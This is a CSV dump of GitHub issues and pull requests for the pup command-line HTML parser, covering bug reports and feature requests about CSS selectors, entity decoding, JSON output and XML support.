ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/65,160592858,MDU6SXNzdWUxNjA1OTI4NTg=,65,EOF when using find and xargs,622959,closed,FALSE,NA,NA,1,2016-06-16T07:12:42Z,2016-07-25T16:17:16Z,2016-07-25T16:17:16Z,NONE,NA,"`find ./ -name ""*"" -type f -print0 | xargs -0 pup 'style text{}'`
Expected: returns style text
Actual: returns EOF for every file passes to pup
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/65/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/65/comments,https://api.github.com/repos/ericchiang/pup/issues/65/events,https://github.com/ericchiang/pup/issues/65,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/64,152765262,MDU6SXNzdWUxNTI3NjUyNjI=,64,Pup gives Trace/breakpoint trap ,11025692,closed,FALSE,NA,NA,5,2016-05-03T12:49:40Z,2016-07-23T05:05:28Z,2016-07-23T05:05:28Z,NONE,NA,"Using : https://github.com/ericchiang/pup/releases/download/v0.3.9/pup_linux_386.zip

bash-4.2$ curl -s https://news.ycombinator.com/ | pup 'table table tr:nth-last-of-type(n+2) td.title a'
Trace/breakpoint trap

Is it some known issue is someone looking onto this?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/64/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/64/comments,https://api.github.com/repos/ericchiang/pup/issues/64/events,https://github.com/ericchiang/pup/issues/64,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/63,150895819,MDExOlB1bGxSZXF1ZXN0Njc3Mzc1Mzg=,63,print newline after content when using the JSON output option,2342749,closed,FALSE,NA,NA,0,2016-04-25T15:17:30Z,2016-04-25T15:17:42Z,2016-04-25T15:17:42Z,OWNER,NA,"closes #62
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/63/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/63/comments,https://api.github.com/repos/ericchiang/pup/issues/63/events,https://github.com/ericchiang/pup/pull/63,https://api.github.com/repos/ericchiang/pup/pulls/63
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/62,149966845,MDU6SXNzdWUxNDk5NjY4NDU=,62,Missing line return after output when using the json{} option,7001119,closed,FALSE,NA,NA,1,2016-04-21T04:55:13Z,2016-04-25T15:18:03Z,2016-04-25T15:17:42Z,NONE,NA,"When using the json{} option, there is a missing line return after the output in a shell.

Example:
 curl -s https://news.ycombinator.com/item?id=9996333 | pup '.comment json{}'
_.... lots and lots of output ... then these last lines ..._
  ""class"": ""comment"",
  ""tag"": ""span""
 }
]**_virtzilla@monstervm:~/Desktop_**

Note the ""]"" isn't on it's own line on the last line as one would expect. Yes, it's a visual nitpick. 
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/62/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/62/comments,https://api.github.com/repos/ericchiang/pup/issues/62/events,https://github.com/ericchiang/pup/issues/62,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/61,143281926,MDU6SXNzdWUxNDMyODE5MjY=,61,Feature Request: Iterate over selected nodes and print out some data,596855,open,FALSE,NA,NA,1,2016-03-24T15:44:07Z,2016-10-11T19:24:56Z,NA,NONE,NA,"Example HTML:

```
<h1 id=""firstHeading"" class=""firstHeading"" lang=""en"">
 <span dir=""auto"">
  Robots exclusion standard
 </span>
 <span dir=""auto2"">
  date: xyz
 </span>
</h1>
```

Now it would be great if pup could be used in a way:
- iterate over all `h1`
- for each h1, print out `Robots exclusion standard, date: xyz`, so the value of span with dir attribute auto, concatenated by a comma and the value of span with dir attribute auto2.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/61/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/61/comments,https://api.github.com/repos/ericchiang/pup/issues/61/events,https://github.com/ericchiang/pup/issues/61,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/60,141800645,MDU6SXNzdWUxNDE4MDA2NDU=,60,String encoding error ?,5772133,closed,FALSE,NA,NA,2,2016-03-18T08:13:15Z,2016-03-18T21:52:23Z,2016-03-18T21:52:23Z,NONE,NA,"Hi, 

When I download an html file with the following command: `curl -O www.mysite.com/index.html`, I get the following snippet:

```
[...]
<div class=""quote"">
    “Normal si c'est lent, on est sur le serveur de dev, pas de prod.”
</div>
[...]
```

Now if I want to parse that with pup like `cat index.html | pup 'div[class=""quote""] text{}'`, I get the following result: 
`“Normal si c&#39;est lent, on est sur le serveur de dev, pas de prod.”`

Is that normal that a single quote becomes '&#39 ;' ? It also happens with text containing accents.

And if I want to parse my file to get a Json output, I get the following result:

```
{
 ""class"": ""quote"",
 ""tag"": ""div"",
 ""text"": ""“Normal si c\u0026#39;est lent, on est sur le serveur de dev, pas de prod.”""
}%
```

Now the quote changes from '&#39 ;' to '\u0026#39;'. Is there a way to have a proper encoding for accents, quotes, etc so that I don't get strange character in my files?

Namaste,
 Mehdi
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/60/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/60/comments,https://api.github.com/repos/ericchiang/pup/issues/60/events,https://github.com/ericchiang/pup/issues/60,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/59,133588730,MDU6SXNzdWUxMzM1ODg3MzA=,59,Multiple commands don't work properly,135988,open,FALSE,NA,NA,4,2016-02-14T22:43:31Z,2021-04-23T18:24:37Z,NA,NONE,NA,"I'm trying to execute this multiple command rule without success:

```
> cat example.html | pup ""h1 span text{} , img#poster attr{src}""
http://images...
> cat example.html | pup ""h1 span text{}""
Demo
> cat example.html | pup ""img#poster attr{src}""
http://images...
```

I don't know if I´m doing something wrong or there is a bug, but I can not get this expected result:

```
> cat example.html | pup ""h1 span text{} , img#poster attr{src}""
Demo http://images...
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/59/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/59/comments,https://api.github.com/repos/ericchiang/pup/issues/59/events,https://github.com/ericchiang/pup/issues/59,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/58,131635730,MDU6SXNzdWUxMzE2MzU3MzA=,58,Change character after 0&nbsp;-,628926,closed,FALSE,NA,NA,1,2016-02-05T12:48:50Z,2016-02-05T16:51:19Z,2016-02-05T16:51:19Z,NONE,NA,"Try to execute the following:

```
echo '0&nbsp;-' | pup
```

This will gives you:

```
0Â -
```

I expect no strange 'Â' character. Try for example:
`echo '0&nbsp;-fsdkfdsf&nbsp;dasd' | pup`

See issue: #55 
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/58/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/58/comments,https://api.github.com/repos/ericchiang/pup/issues/58/events,https://github.com/ericchiang/pup/issues/58,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/57,126156998,MDU6SXNzdWUxMjYxNTY5OTg=,57,import pup in code,586675,closed,FALSE,NA,NA,4,2016-01-12T11:19:44Z,2018-09-15T18:00:00Z,2016-01-12T17:19:01Z,NONE,NA,"Hi, 

fairly new to Go, I don't know how to use pup in my code, without relying on pup binary.
(I would like to transform a script using curl to a pure Go solution).

How to call ParseHTML(pupIn, pupCharset) as it's in main package? 

How is it best feasible. Sorry if the question is trivial and if it is more about documentation or packaging as a dependency than a real issue.

Thanks in advance.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/57/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/57/comments,https://api.github.com/repos/ericchiang/pup/issues/57/events,https://github.com/ericchiang/pup/issues/57,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/56,126035797,MDU6SXNzdWUxMjYwMzU3OTc=,56,Single/double quotes appear as html entities,3475002,closed,FALSE,NA,NA,1,2016-01-11T21:01:46Z,2016-01-11T21:04:30Z,2016-01-11T21:04:15Z,NONE,NA,"Single and double qoutes are displayed as html entities even if text{} modifier is used
Actual:

```
$ echo ""<div>\""quote'd\""</div>"" | pup ""div text{}""
&#34;quote&#39;d&#34;
```

Expected

```
$ echo ""<div>\""quote'd\""</div>"" | pup ""div text{}""
""quote'd""
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/56/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/56/comments,https://api.github.com/repos/ericchiang/pup/issues/56/events,https://github.com/ericchiang/pup/issues/56,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/55,125434478,MDU6SXNzdWUxMjU0MzQ0Nzg=,55,Getting strange characters for eg. &nbsp;,628926,open,FALSE,NA,NA,15,2016-01-07T16:49:13Z,2020-07-09T13:53:08Z,NA,NONE,NA,"When the content contains `&nbsp;`, I will get ""Â"" character.

Kind regards,
Melroy
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/55/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/55/comments,https://api.github.com/repos/ericchiang/pup/issues/55/events,https://github.com/ericchiang/pup/issues/55,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/54,112975389,MDU6SXNzdWUxMTI5NzUzODk=,54,pup doesn't work when using single quotes,3040770,open,FALSE,NA,NA,4,2015-10-23T08:24:14Z,2016-08-17T06:00:30Z,NA,NONE,NA,"pup -f myfile ""p"" works
pup -f myfile 'p'  does not work
(on windows)
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/54/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/54/comments,https://api.github.com/repos/ericchiang/pup/issues/54/events,https://github.com/ericchiang/pup/issues/54,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/53,109280073,MDExOlB1bGxSZXF1ZXN0NDY1MTE1ODc=,53,fixed some typos,1180780,closed,FALSE,NA,NA,0,2015-10-01T11:20:09Z,2015-10-01T13:37:26Z,2015-10-01T13:37:25Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/53/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/53/comments,https://api.github.com/repos/ericchiang/pup/issues/53/events,https://github.com/ericchiang/pup/pull/53,https://api.github.com/repos/ericchiang/pup/pulls/53
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/52,105265346,MDU6SXNzdWUxMDUyNjUzNDY=,52,Support for generic xml,475451,open,FALSE,NA,NA,4,2015-09-07T20:35:58Z,2020-03-11T06:04:49Z,NA,NONE,NA,"If I try to match a tag which is not defined in html, pup will silently fail.
For example:
    echo ""<x class=""y"" />"" | pup ""x""

will fail and print nothing. But both of

```
echo ""<x class=""y"" />"" | pup "".y""

echo ""<a class=""y"" />"" | pup ""a""
```

will print the tag.

I would love to be able to use pup for filtering arbitrary xml-files, and not just actual html-files.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/52/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/52/comments,https://api.github.com/repos/ericchiang/pup/issues/52/events,https://github.com/ericchiang/pup/issues/52,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/51,103320517,MDU6SXNzdWUxMDMzMjA1MTc=,51,Using pup to modify html,160627,open,FALSE,NA,NA,12,2015-08-26T17:01:01Z,2020-07-29T05:50:30Z,NA,NONE,NA,"I have a use case where I want to add a `class=""table""` to all table tags, that don't already have that class specified. Currently I use a hacky sed to do it, but I was wondering if pup could be a more robust way of doing that.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/51/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/51/comments,https://api.github.com/repos/ericchiang/pup/issues/51/events,https://github.com/ericchiang/pup/issues/51,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/50,103039866,MDU6SXNzdWUxMDMwMzk4NjY=,50,decode html entities when using text{},1829711,closed,FALSE,NA,NA,2,2015-08-25T14:52:58Z,2015-09-24T19:40:01Z,2015-09-24T19:40:01Z,NONE,NA,"Maybe it would make sense to provide an option to decode html entities when using text{} output and thus output &/</... instead of &amp;/&lt/....

I'm now piping the output of pup in 'recode html' which seems to do the trick.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/50/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/50/comments,https://api.github.com/repos/ericchiang/pup/issues/50/events,https://github.com/ericchiang/pup/issues/50,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/49,98815648,MDU6SXNzdWU5ODgxNTY0OA==,49,print each matching element on one line,1048685,open,FALSE,NA,NA,15,2015-08-03T18:54:08Z,2018-04-23T00:21:02Z,NA,NONE,NA,"When I do `curl -s https://news.ycombinator.com/item?id=9996333 | pup '.comment'` I'm having a hard time taking the output and passing it along, maybe greping for text in the matched elements or sorting or something.
Do you see an easier way to use the output than having an option to put each matched element on one line?   
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/49/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/49/comments,https://api.github.com/repos/ericchiang/pup/issues/49/events,https://github.com/ericchiang/pup/issues/49,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/48,98788588,MDU6SXNzdWU5ODc4ODU4OA==,48,Feature request: line numbers in JSON output,176188,closed,FALSE,NA,NA,3,2015-08-03T16:38:05Z,2015-08-03T17:00:14Z,2015-08-03T17:00:14Z,NONE,NA,"How about adding a `line_number` key to the json object generated the `json{}` display function?

The use-case I have in mind is calling out to pup from vim and loading the results back into into vim's quickfix list to quickly jump between matched lines.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/48/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/48/comments,https://api.github.com/repos/ericchiang/pup/issues/48/events,https://github.com/ericchiang/pup/issues/48,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/47,97268142,MDU6SXNzdWU5NzI2ODE0Mg==,47,Separate CSS selector logic into it's own package,2342749,open,FALSE,NA,NA,1,2015-07-26T00:01:35Z,2016-02-05T16:56:54Z,NA,OWNER,NA,"The CSS parsing in pup is a bit of a mess right now. It's extremely ad hoc, hard to test, and sometimes just incorrect (#46 and #52).

A proposed improvement is a [`regexp`](https://golang.org/pkg/regexp/) style compiler + executer. Something along the lines of

``` go
package css

import ""golang.org/x/net/html""

type Selector struct {
    // fields
}

func Compile(expr string) (*Selector, error) {
    // compile css selector
}

func (s *Selector) Select(node *html.Node) []*html.Node {
    // run the selector
}
```

This would massively simplify pup and help with testing. 
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/47/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/47/comments,https://api.github.com/repos/ericchiang/pup/issues/47/events,https://github.com/ericchiang/pup/issues/47,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/46,96693039,MDU6SXNzdWU5NjY5MzAzOQ==,46,Some selectors do do work properly.,1451509,open,FALSE,NA,NA,1,2015-07-22T23:49:11Z,2015-08-03T16:42:44Z,NA,NONE,NA,"- `pup 'html > body > *' <<<'<a>test</a>'`
  
  ```
  <body>
  <a>
  test
  </a>
  </body>
  ```
  
  should not output `<body>` tags.
- `pup 'html>body' <<<'<a>test</a>'`
  
  ```
  ```
  
  No output?
- `pup 'head ~ body' <<<'<a>test</a>'`
  
  ```
  ```
  
  No output?
- `pup 'head+body' <<<'<a>test</a>'`
  
  ```
  ```
  
  No output?
- `pup 'another' <<<'<another>test</another>'`
  
  ```
  ```
  
  No support for custom tags.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/46/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/46/comments,https://api.github.com/repos/ericchiang/pup/issues/46/events,https://github.com/ericchiang/pup/issues/46,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/45,93936592,MDU6SXNzdWU5MzkzNjU5Mg==,45,Does pup supports XML?,546325,closed,FALSE,NA,NA,2,2015-07-09T02:34:13Z,2015-07-09T17:46:29Z,2015-07-09T17:22:11Z,NONE,NA,"I'm trying to extract an attribute from a node in this XML (taken from http://www.radio-canada.ca/Medianet/2010/CBF/DeRemarquablesOublies201001210200_m.asx):

``` xml
<ASX xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
  <TITLE>Écoutez la tribune sur François-Xavier Aubry</TITLE>
  <PARAM NAME=""isJeunesse"" VALUE=""False"" />
  <PARAM NAME=""isVirtualClip"" VALUE=""False"" />
  <ENTRY>
    <REF HREF=""http://medias-wm.radio-canada.ca/diffusion/2010/medianet/CBF/DeRemarquablesOublies201001210200_m.wma"" />
    <DURATION VALUE=""00:55:00.000"" />
    <PARAM NAME=""ASX"" VALUE=""http://www.radio-canada.ca/Medianet/2010/CBF/DeRemarquablesOublies201001210200_m.asx"" />
    <PARAM NAME=""isVideo"" VALUE=""False"" />
    <PARAM NAME=""fileType"" VALUE=""wma"" />
    <PARAM NAME=""isLive"" VALUE=""false"" />
    <PARAM NAME=""emission"" VALUE=""De remarquables oubliés"" />
    <PARAM NAME=""chaine"" VALUE=""CBF"" />
    <PARAM NAME=""diffusion"" VALUE=""integral"" />
    <PARAM NAME=""station"" VALUE=""Montréal"" />
    <STARTTIME VALUE=""00:00:00.000"" />
  </ENTRY>
```

I couldn't find any means to extract REF's HREF attribute. I tried 'ref attr{href}' and many other things ('entry:first-child attr{href}' comes to mind).

The -c flag works but mangles the DOM a little, which lead me to think that parsing that XML would work fine. Extracting title works.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/45/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/45/comments,https://api.github.com/repos/ericchiang/pup/issues/45/events,https://github.com/ericchiang/pup/issues/45,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/44,83173549,MDExOlB1bGxSZXF1ZXN0MzY1ODgyMzc=,44,readme.md: corrected homebrew’s name,1699443,closed,FALSE,NA,NA,1,2015-05-31T19:59:47Z,2015-06-01T14:27:03Z,2015-06-01T14:26:39Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/44/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/44/comments,https://api.github.com/repos/ericchiang/pup/issues/44/events,https://github.com/ericchiang/pup/pull/44,https://api.github.com/repos/ericchiang/pup/pulls/44
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/43,83173490,MDExOlB1bGxSZXF1ZXN0MzY1ODgyMzA=,43,Use official Hombrew link,1699443,closed,FALSE,NA,NA,4,2015-05-31T19:59:33Z,2017-01-31T16:08:41Z,2017-01-31T16:08:40Z,CONTRIBUTOR,NA,"[It is maintained and up to date](https://github.com/Homebrew/homebrew/blob/master/Library/Formula/pup.rb). It’s more straightforward to users to install it this way.
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/43/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/43/comments,https://api.github.com/repos/ericchiang/pup/issues/43/events,https://github.com/ericchiang/pup/pull/43,https://api.github.com/repos/ericchiang/pup/pulls/43
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/42,76005716,MDU6SXNzdWU3NjAwNTcxNg==,42,Binary pup files for all platforms,1409333,closed,FALSE,NA,NA,2,2015-05-13T14:33:24Z,2018-07-09T21:34:50Z,2015-05-13T14:34:17Z,NONE,NA,"So I can install on linux server without installing go.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/42/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/42/comments,https://api.github.com/repos/ericchiang/pup/issues/42/events,https://github.com/ericchiang/pup/issues/42,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/41,74951270,MDU6SXNzdWU3NDk1MTI3MA==,41,json{} is not isomorphic,1037931,closed,FALSE,2342749,NA,2,2015-05-10T16:22:49Z,2015-06-10T12:03:42Z,2015-06-10T12:03:42Z,NONE,NA,"This one is a bit troublesome: it's a big issue (I think), but it may break backward compatibility :/

The issue is that pup will return a json array in most cases, except if there is a single element. It's an issue, because it makes it harder to work with the general case (when we don't know how much results we will get). Could it be possible to change this behavior?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/41/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/41/comments,https://api.github.com/repos/ericchiang/pup/issues/41/events,https://github.com/ericchiang/pup/issues/41,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/40,74933050,MDU6SXNzdWU3NDkzMzA1MA==,40,json{} doesn't decode html entities,1037931,closed,FALSE,NA,NA,1,2015-05-10T14:42:29Z,2015-05-10T14:52:46Z,2015-05-10T14:52:46Z,NONE,NA,"Hi, maybe it would be interesting to automatically decode the html entities when building a json object, don't you think?

ie. that

``` html
<div>&amp;</div>
```

would give

``` js
{
    ""text"" : ""&"",
    ...
}
```

rather than

``` js
{
    ""text"" : ""&amp;"",
    ...
}
```

Since people will almost always have to convert it anyway (and that `jq` doesn't seem to have any builtin for this :()
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/40/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/40/comments,https://api.github.com/repos/ericchiang/pup/issues/40/events,https://github.com/ericchiang/pup/issues/40,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/39,74311017,MDU6SXNzdWU3NDMxMTAxNw==,39,Feature Request: :eq(index) selector,1037931,open,FALSE,NA,NA,6,2015-05-08T10:11:33Z,2016-02-11T18:03:05Z,NA,NONE,NA,"Hi,

Could it be possible to implement the [jQuery :eq() selector](https://api.jquery.com/eq-selector/)? Sometimes :nth-child is not enough to select the right element :)
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/39/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/39/comments,https://api.github.com/repos/ericchiang/pup/issues/39/events,https://github.com/ericchiang/pup/issues/39,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/38,68742829,MDU6SXNzdWU2ODc0MjgyOQ==,38,"Can "":not"" only negate simple selector?",2749683,closed,FALSE,NA,NA,2,2015-04-15T17:39:00Z,2015-04-15T17:48:23Z,2015-04-15T17:42:21Z,NONE,NA,"e.g _':not(:first-child)'_ will yield parsing error on _pup 0.3.7_.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/38/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/38/comments,https://api.github.com/repos/ericchiang/pup/issues/38/events,https://github.com/ericchiang/pup/issues/38,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/37,64927655,MDU6SXNzdWU2NDkyNzY1NQ==,37,Using Pup as a library/Feature Request,7126128,closed,FALSE,NA,NA,2,2015-03-28T10:41:28Z,2015-09-25T04:18:26Z,2015-09-24T19:40:30Z,NONE,NA,"Hi, is there a way to use pup as a library? E.g. 

``` Go
Package main
import (""github.com/ericchiang/pup""
""net/http"")

cssSelector :=`...` //CSS selectors
 func main(){
page,err := http.Get(news.ycombinator.com)
result:=Pup.load(page).select(cssSelector)
fmt.Println(result)
}

```

Thanks in advance!
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/37/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/37/comments,https://api.github.com/repos/ericchiang/pup/issues/37/events,https://github.com/ericchiang/pup/issues/37,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/36,64919785,MDU6SXNzdWU2NDkxOTc4NQ==,36,Outputting to CSV,7126128,closed,FALSE,NA,NA,1,2015-03-28T08:55:02Z,2015-03-28T12:29:09Z,2015-03-28T12:29:09Z,NONE,NA,"Hi, is there a way to output to csv?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/36/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/36/comments,https://api.github.com/repos/ericchiang/pup/issues/36/events,https://github.com/ericchiang/pup/issues/36,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/35,63449893,MDU6SXNzdWU2MzQ0OTg5Mw==,35,Feature Request:XPath,7126128,open,FALSE,NA,NA,4,2015-03-21T19:49:01Z,2018-10-09T19:40:45Z,NA,NONE,NA,"Hi, any plans for XPath support?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/35/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/35/comments,https://api.github.com/repos/ericchiang/pup/issues/35/events,https://github.com/ericchiang/pup/issues/35,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/34,57130565,MDU6SXNzdWU1NzEzMDU2NQ==,34,Please show me how '+' operator used,1784887,closed,FALSE,NA,NA,1,2015-02-10T04:51:18Z,2015-03-21T20:14:31Z,2015-03-21T20:14:31Z,NONE,NA,"I can not understand usage of the '+' operator as wiki said.
pup 'selector + selector'
pup 'div + a' , Is this usage right? but it does not show any results.
Please give more examples. Thank you
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/34/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/34/comments,https://api.github.com/repos/ericchiang/pup/issues/34/events,https://github.com/ericchiang/pup/issues/34,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/33,56195991,MDU6SXNzdWU1NjE5NTk5MQ==,33,Preformatted text gets messed up,628445,closed,FALSE,NA,NA,8,2015-02-02T04:54:08Z,2015-04-05T23:20:32Z,2015-04-05T19:33:20Z,NONE,NA,"Prettification and indentation by pup messes up preformatted text.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/33/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/33/comments,https://api.github.com/repos/ericchiang/pup/issues/33/events,https://github.com/ericchiang/pup/issues/33,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/32,56174181,MDExOlB1bGxSZXF1ZXN0Mjg0MzU0OTA=,32,0.3.8,2342749,closed,FALSE,NA,NA,0,2015-02-01T19:17:40Z,2015-04-05T19:01:35Z,2015-02-01T19:17:45Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/32/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/32/comments,https://api.github.com/repos/ericchiang/pup/issues/32/events,https://github.com/ericchiang/pup/pull/32,https://api.github.com/repos/ericchiang/pup/pulls/32
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/31,54619368,MDU6SXNzdWU1NDYxOTM2OA==,31,Unrecognized flag '--number',121520,closed,FALSE,NA,NA,4,2015-01-16T20:10:37Z,2015-02-01T19:32:24Z,2015-02-01T19:24:59Z,NONE,NA,"On version 0.3.7 (and Ubuntu 14.04, if that matters):

``` sh
   curl -s http://example.com | pup --number 'p'
  Unrecognized flag '--number'
  (23) Failed writing body
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/31/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/31/comments,https://api.github.com/repos/ericchiang/pup/issues/31/events,https://github.com/ericchiang/pup/issues/31,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/30,53574327,MDU6SXNzdWU1MzU3NDMyNw==,30,Is slice{} no longer included?,3527647,closed,FALSE,NA,NA,1,2015-01-06T22:54:08Z,2015-01-07T05:45:52Z,2015-01-07T05:45:52Z,NONE,NA,"on laptop

```
[foo@bar ]$ pup --version
0.3.2
[foo@bar ]$ curl -s www.google.com | pup a slice{0}
<a class=""gb1"" href=""http://www.google.com/imghp?hl=en&amp;tab=wi"">
  Images
  </a>
[foo@bar ]$
```

on desktop

```
[foo@bar pup]$ ./pup --version
0.3.7
[foo@bar pup]$ curl -s www.google.com | ./pup a slice{0}
[foo@bar pup]$
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/30/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/30/comments,https://api.github.com/repos/ericchiang/pup/issues/30/events,https://github.com/ericchiang/pup/issues/30,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/29,50981479,MDU6SXNzdWU1MDk4MTQ3OQ==,29,+ and > swapped?,1685157,closed,FALSE,NA,NA,3,2014-12-04T14:30:22Z,2014-12-07T18:36:30Z,2014-12-07T02:08:47Z,NONE,NA,"When I use the `Copy Unique selector` function of Firefox Inspector, and try to use the selector with pup on the same html file, it doesn't give any results. After changing all `>`s to `+`s it returns the expected element.
